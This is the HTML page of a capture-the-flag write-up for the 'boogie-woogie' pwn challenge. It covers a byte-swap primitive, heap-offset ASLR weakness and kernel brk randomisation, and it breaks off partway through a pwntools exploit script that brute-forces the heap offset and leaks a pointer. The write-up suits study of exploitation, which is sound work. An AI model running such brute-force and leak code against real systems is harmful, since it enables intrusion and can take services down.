@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>boogie-woogie</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/dicectf-quals-2024/boogie-woogie/#code-overview">code overview</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/dicectf-quals-2024/boogie-woogie/#wait-where-s-the-heap">wait where&#x27;s the heap?</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/dicectf-quals-2024/boogie-woogie/#manifesting-a-libc-pointer-in-the-heap">manifesting a libc pointer in the heap</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/dicectf-quals-2024/boogie-woogie/#win">win</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>boogie-woogie</h1>
+    </header>
+
+    <div class="content">
+        <h2 id="code-overview">code overview</h2>
+<p>boogie-woogie is a fairly simple program</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffcc66;">000011</span><span style="color:#ff3333;">a9  </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">* </span><span style="color:#ffd580;">clap</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> arg1</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> arg2)
+</span><span>
+</span><span style="color:#ffcc66;">000011</span><span style="color:#ff3333;">eb      </span><span style="color:#f29e74;">*</span><span>(arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">= *</span><span>(arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">^ *</span><span>(arg2 </span><span style="color:#f29e74;">+ &amp;</span><span>data)
+</span><span style="color:#ffcc66;">0000121</span><span style="color:#ffa759;">f      </span><span style="color:#f29e74;">*</span><span>(arg2 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">= *</span><span>(arg2 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">^ *</span><span>(arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data)
+</span><span style="color:#ffcc66;">00001253      </span><span style="color:#f29e74;">*</span><span>(arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">= *</span><span>(arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data) </span><span style="color:#f29e74;">^ *</span><span>(arg2 </span><span style="color:#f29e74;">+ &amp;</span><span>data)
+</span><span style="color:#ffcc66;">00001257      </span><span style="color:#ffa759;">return</span><span> arg1 </span><span style="color:#f29e74;">+ &amp;</span><span>data
+</span><span>
+</span><span style="color:#ffcc66;">0000125</span><span style="color:#ff3333;">8  </span><span style="font-style:italic;color:#5ccfe6;">int32_t </span><span style="color:#ffd580;">main</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int32_t</span><span> argc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">**</span><span> argv</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">**</span><span> envp)
+</span><span>
+</span><span style="color:#ffcc66;">00001264      </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">*</span><span> fsbase
+</span><span style="color:#ffcc66;">00001264      </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> rax </span><span style="color:#f29e74;">= *</span><span>(fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)
+</span><span style="color:#ffcc66;">0000127</span><span style="color:#ff3333;">d      </span><span style="color:#f28779;">puts</span><span>(str</span><span style="color:#f29e74;">: &amp;</span><span>__art)
+</span><span style="color:#ffcc66;">000012</span><span style="color:#ff3333;">8c      </span><span style="color:#f28779;">puts</span><span>(str</span><span style="color:#f29e74;">: </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x1b</span><span style="color:#bae67e;">[0;33mEven this cursed spiri…&quot;</span><span>)
+</span><span style="color:#ffcc66;">00001303      </span><span style="color:#ffa759;">while </span><span>(data </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>)
+</span><span style="color:#ffcc66;">000012</span><span style="color:#ff3333;">9</span><span style="color:#ffcc66;">3          </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> var_18 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span style="color:#ffcc66;">000012</span><span style="color:#ff3333;">b4          </span><span style="color:#f28779;">printf</span><span>(format</span><span style="color:#f29e74;">: </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\x1b</span><span style="color:#bae67e;">[31;49;1;4m</span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\x1b</span><span style="color:#bae67e;">[0m</span><span style="color:#95e6cb;">\n\n\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>data)
+</span><span style="color:#ffcc66;">000012</span><span style="color:#ff3333;">c3          </span><span style="color:#f28779;">puts</span><span>(str</span><span style="color:#f29e74;">: </span><span style="color:#bae67e;">&quot;The sound of </span><span style="color:#95e6cb;">\x1b</span><span style="color:#bae67e;">[0;33mgion shoj…&quot;</span><span>)
+</span><span style="color:#ffcc66;">000012e2          </span><span style="font-style:italic;color:#5ccfe6;">int64_t</span><span> var_20
+</span><span style="color:#ffcc66;">000012e2          </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(format</span><span style="color:#f29e74;">: </span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%zu %zu</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_20</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">&amp;</span><span>var_18)
+</span><span style="color:#ffcc66;">000012</span><span style="color:#ff3333;">f5          </span><span style="color:#ffd580;">clap</span><span>(var_20</span><span style="color:#ccc9c2cc;">,</span><span> var_18)
+</span><span style="color:#ffcc66;">0000130</span><span style="color:#ff3333;">e      </span><span style="color:#f29e74;">*</span><span>(fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)
+</span><span style="color:#ffcc66;">00001317      </span><span style="color:#ffa759;">if </span><span>(rax </span><span style="color:#f29e74;">== *</span><span>(fsbase </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>))
+</span><span style="color:#ffcc66;">0000131</span><span style="color:#ffa759;">f          return </span><span style="color:#ffcc66;">0
+</span><span style="color:#ffcc66;">0000131</span><span style="color:#ff3333;">9      </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()
+</span><span style="color:#ffcc66;">0000131</span><span style="color:#ff3333;">9</span><span>      noreturn
+</span><span>
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>❯ checksec boogie-woogie
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>.data (PROGBITS) section started  {0xf000-0xf0b7}
+</span><span>0000f000  __data_start:
+</span><span>0000f000  00 00 00 00 00 00 00 00                                                                          ........
+</span><span>
+</span><span>0000f008  void* __dso_handle = __dso_handle
+</span><span>
+</span><span>0000f010                                                  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                  ................
+</span><span>
+</span><span>0000f020  char data[0x97] = &quot;Listen closely, cursed spirit. There is no way you do not know this. An arm is\n&quot;
+</span><span>0000f020      &quot;merely a decoration. The act of applause is an acclamation of the soul!&quot;, 0
+</span><span>.data (PROGBITS) section ended  {0xf000-0xf0b7}
+</span><span>.bss (NOBITS) section started  {0xf0b7-0xf0b8}
+</span><span>0000f0b7  char __bss_start = 0x0
+</span><span>.bss (NOBITS) section ended  {0xf0b7-0xf0b8}
+</span><span>
+</span><span>
+</span></code></pre>
+<p>Simple in this case means that it's easy to understand and very difficult to solve. We have the ability to swap bytes relative to the program base but... there isn't really much there.</p>
+<blockquote class='callout info' data-callout="info">
+<div class="callout-title">
+<div class="callout-icon"></div>
+<div class="callout-title-inner">__dso_handle?</div>
+</div>
+tl;dr its just a uuid lol
+<br>
+<p>it is initialized at runtime to a recursive pointer (PIE + 0xf008) and is used to filter which atexit functions run when an object is unloaded. It is a pointer because it is implicitly unique but it is never dereferenced.</p>
+</blockquote>
+<p>I was stuck at this point for a long time -- we had an obvious and fairly strong primitive but nothing to do with it.  This challenge is running under ASLR so we don't know the location of any memory segments (besides the program itself, which can be leaked from <code>__dso_handle</code>).</p>
+<h2 id="wait-where-s-the-heap">wait where's the heap?</h2>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>gef&gt; vmmap
+</span><span>[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
+</span><span>Start              End                Size               Offset             Perm Path
+</span><span>0x000055f39d069000 0x000055f39d06a000 0x0000000000001000 0x0000000000000000 r-- /app/boogie-woogie
+</span><span>0x000055f39d06a000 0x000055f39d06b000 0x0000000000001000 0x0000000000001000 r-x /app/boogie-woogie
+</span><span>0x000055f39d06b000 0x000055f39d077000 0x000000000000c000 0x0000000000002000 r-- /app/boogie-woogie
+</span><span>0x000055f39d077000 0x000055f39d078000 0x0000000000001000 0x000000000000d000 r-- /app/boogie-woogie
+</span><span>0x000055f39d078000 0x000055f39d079000 0x0000000000001000 0x000000000000e000 rw- /app/boogie-woogie
+</span><span>0x000055f39de0e000 0x000055f39de2f000 0x0000000000021000 0x0000000000000000 rw- [heap]  &lt;-  $rsi, $r9
+</span></code></pre>
+<p>Not all areas of memory are randomized the same way.  The offset between .data and the heap is randomized by ASLR but it's not.... that... random?  I knew from staring at memory maps that it was always in the same general area, tested it experimentally with gdb, and then after the fact looked it up in the kernel source code.  The heap on x86/64 Linux starts between 0 and 8192 pages after the end of the program (in the no-aslr case this is always 0; it starts directly after the program).</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/linux/latest/source/fs/binfmt_elf.c#L1254
+</span><span style="color:#ffa759;">if </span><span>((current</span><span style="color:#f29e74;">-&gt;</span><span>flags </span><span style="color:#f29e74;">&amp;</span><span> PF_RANDOMIZE) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(randomize_va_space </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">1</span><span>)) {
+</span><span>	</span><span style="font-style:italic;color:#5c6773;">/*
+</span><span style="font-style:italic;color:#5c6773;">	 * For architectures with ELF randomization, when executing
+</span><span style="font-style:italic;color:#5c6773;">	 * a loader directly (i.e. no interpreter listed in ELF
+</span><span style="font-style:italic;color:#5c6773;">	 * headers), move the brk area out of the mmap region
+</span><span style="font-style:italic;color:#5c6773;">	 * (since it grows up, and may collide early with the stack
+</span><span style="font-style:italic;color:#5c6773;">	 * growing down), and into the unused ELF_ET_DYN_BASE region.
+</span><span style="font-style:italic;color:#5c6773;">	 */
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#ffd580;">IS_ENABLED</span><span>(CONFIG_ARCH_HAS_ELF_RANDOMIZE) </span><span style="color:#f29e74;">&amp;&amp;
+</span><span>		elf_ex</span><span style="color:#f29e74;">-&gt;</span><span>e_type </span><span style="color:#f29e74;">==</span><span> ET_DYN </span><span style="color:#f29e74;">&amp;&amp; !</span><span>interpreter) {
+</span><span>		mm</span><span style="color:#f29e74;">-&gt;</span><span>brk </span><span style="color:#f29e74;">=</span><span> mm</span><span style="color:#f29e74;">-&gt;</span><span>start_brk </span><span style="color:#f29e74;">=</span><span> ELF_ET_DYN_BASE</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>
+</span><span>	mm</span><span style="color:#f29e74;">-&gt;</span><span>brk </span><span style="color:#f29e74;">=</span><span> mm</span><span style="color:#f29e74;">-&gt;</span><span>start_brk </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">arch_randomize_brk</span><span>(mm)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">#ifdef</span><span> compat_brk_randomized
+</span><span>	current</span><span style="color:#f29e74;">-&gt;</span><span>brk_randomized </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">#endif
+</span><span>}
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/linux/v6.7.4/source/arch/x86/kernel/process.c#L1031
+</span><span style="color:#ffa759;">unsigned long </span><span style="color:#ffd580;">arch_randomize_brk</span><span>(</span><span style="color:#ffa759;">struct</span><span> mm_struct </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">mm</span><span>)
+</span><span>{
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">randomize_page</span><span>(mm</span><span style="color:#f29e74;">-&gt;</span><span>brk</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x02000000</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;">// https://elixir.bootlin.com/linux/v6.7.4/source/mm/util.c#L338
+</span><span style="font-style:italic;color:#5c6773;">/**
+</span><span style="font-style:italic;color:#5c6773;"> * randomize_page - Generate a random, page aligned address
+</span><span style="font-style:italic;color:#5c6773;"> * @start:	The smallest acceptable address the caller will take.
+</span><span style="font-style:italic;color:#5c6773;"> * @range:	The size of the area, starting at @start, within which the
+</span><span style="font-style:italic;color:#5c6773;"> *		random address must fall.
+</span><span style="font-style:italic;color:#5c6773;"> *
+</span><span style="font-style:italic;color:#5c6773;"> * If @start + @range would overflow, @range is capped.
+</span><span style="font-style:italic;color:#5c6773;"> *
+</span><span style="font-style:italic;color:#5c6773;"> * NOTE: Historical use of randomize_range, which this replaces, presumed that
+</span><span style="font-style:italic;color:#5c6773;"> * @start was already page aligned.  We now align it regardless.
+</span><span style="font-style:italic;color:#5c6773;"> *
+</span><span style="font-style:italic;color:#5c6773;"> * Return: A page aligned address within [start, start + range).  On error,
+</span><span style="font-style:italic;color:#5c6773;"> * @start is returned.
+</span><span style="font-style:italic;color:#5c6773;"> */
+</span><span style="color:#ffa759;">unsigned long </span><span style="color:#ffd580;">randomize_page</span><span>(</span><span style="color:#ffa759;">unsigned long </span><span style="color:#ffcc66;">start</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">unsigned long </span><span style="color:#ffcc66;">range</span><span>)
+</span><span>{
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span style="color:#ffd580;">PAGE_ALIGNED</span><span>(start)) {
+</span><span>		range </span><span style="color:#f29e74;">-= </span><span style="color:#ffd580;">PAGE_ALIGN</span><span>(start) </span><span style="color:#f29e74;">-</span><span> start</span><span style="color:#ccc9c2cc;">;
+</span><span>		start </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">PAGE_ALIGN</span><span>(start)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(start </span><span style="color:#f29e74;">&gt;</span><span> ULONG_MAX </span><span style="color:#f29e74;">-</span><span> range)
+</span><span>		range </span><span style="color:#f29e74;">=</span><span> ULONG_MAX </span><span style="color:#f29e74;">-</span><span> start</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	range </span><span style="color:#f29e74;">&gt;&gt;=</span><span> PAGE_SHIFT</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(range </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>)
+</span><span>		</span><span style="color:#ffa759;">return</span><span> start</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	</span><span style="color:#ffa759;">return</span><span> start </span><span style="color:#f29e74;">+ </span><span>(</span><span style="color:#ffd580;">get_random_long</span><span>() </span><span style="color:#f29e74;">%</span><span> range </span><span style="color:#f29e74;">&lt;&lt;</span><span> PAGE_SHIFT)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span></code></pre>
+<p>To be quite honest this is enough on it's own.  A 1-in-8192 brute isn't exactly fast but frankly I've done stupider things for a flag than a three hour brute (sry not sry infra; someone actually took it down doing this and got a POW added).</p>
+<p>In the end though there was a pretty easy optimization that could cut that down to merely a couple hundred throws.  The heap is (in this program, at the current state) 33 pages long and all we need to do is land somewhere inside the heap.   Once we know a valid heap offset, we can walk back until the  tcache perthread header is found -- bringing an 1/8192 chance down to 1/250-ish.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>e </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;boogie-woogie&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;zellij&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;action&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;new-pane&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;right&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;--&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;zsh&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-c&quot;</span><span>]
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>e
+</span><span>
+</span><span>
+</span><span style="color:#ccc9c2cc;">@</span><span>context</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">quietfunc
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([e</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([e</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;localhost&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5000</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">return </span><span>r
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">brute_heap_offset</span><span>():
+</span><span>        idx </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>        </span><span style="color:#ffa759;">with </span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">progress</span><span>(</span><span style="color:#bae67e;">&#39;Bruting&#39;</span><span>) </span><span style="color:#ffa759;">as </span><span>p:
+</span><span>            </span><span style="color:#ffa759;">while </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>                </span><span style="color:#ffa759;">try</span><span>:
+</span><span>                    idx </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span>                    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">status</span><span>(</span><span style="color:#bae67e;">&quot;attempt </span><span style="color:#ffcc66;">%i</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span>idx)
+</span><span>                    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception&quot;</span><span>)
+</span><span>                    trial_heap_offset </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x1995fe0
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;"># trial_heap_offset = 0x1000 # lol testing without aslr
+</span><span>                    
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{trial_heap_offset}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>                    
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception&quot;</span><span>)
+</span><span>                    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;1 </span><span>{trial_heap_offset}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>                    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">success</span><span>()
+</span><span>                    </span><span style="color:#ffa759;">return </span><span>(r</span><span style="color:#ccc9c2cc;">, </span><span>trial_heap_offset </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">12 </span><span style="color:#f29e74;">&lt;&lt; </span><span style="color:#ffcc66;">12</span><span>)
+</span><span>                </span><span style="color:#ffa759;">except </span><span style="font-style:italic;color:#5ccfe6;">EOFError</span><span>:
+</span><span>                    </span><span style="color:#ffa759;">with </span><span>context</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">local</span><span>(</span><span style="color:#ffcc66;">log_level</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;error&#39;</span><span>): r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>
+</span><span>
+</span><span>    r, heap_page </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">brute_heap_offset</span><span>()
+</span><span>
+</span><span>
+</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(</span><span style="color:#ffcc66;">b</span><span>):
+</span><span>        </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{b</span><span style="color:#f29e74;">+</span><span>x} {</span><span style="color:#ffcc66;">1</span><span style="color:#f29e74;">+</span><span>x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>        </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;4m&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;L&quot;</span><span>)
+</span><span>        ptr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">6</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>))
+</span><span>        </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{b</span><span style="color:#f29e74;">+</span><span>x} {</span><span style="color:#ffcc66;">1</span><span style="color:#f29e74;">+</span><span>x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
+</span><span>
+</span><span>        </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">8</span><span>):
+</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;exception:&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>ptr
+</span><span>
+</span><span>
+</span><span>    __dso_handle </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_relative_ptr</span><span>(</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">24</span><span>)
+</span><span>    e</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">=  </span><span>__dso_handle </span><span style="color:#f29e74;">- </span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__dso_handle&#39;</span><span>]
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;__dso_handle = </span><span>{</span><span style="color:#f28779;">hex</span><span>(__dso_handle)}</span><span style="color:#bae67e;">&#39;</span><span>)
